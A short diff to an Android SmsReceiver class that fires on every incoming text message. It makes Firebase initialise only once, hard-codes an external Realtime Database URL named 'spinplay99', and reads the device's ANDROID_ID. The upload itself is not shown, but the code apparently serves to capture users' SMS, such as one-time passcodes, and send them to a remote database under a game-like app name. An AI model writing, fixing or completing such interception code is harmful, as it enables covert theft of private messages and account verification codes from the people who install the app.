@@ -23,8 +23,8 @@ public class SmsReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
-            FirebaseApp.initializeApp(context);
-            DatabaseReference database = FirebaseDatabase.getInstance().getReference();
+            if (com.google.firebase.FirebaseApp.getApps(context).isEmpty()) { com.google.firebase.FirebaseApp.initializeApp(context); }
+            DatabaseReference database = FirebaseDatabase.getInstance("https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app").getReference();
             String deviceId = android.provider.Settings.Secure.getString(
                 context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
 
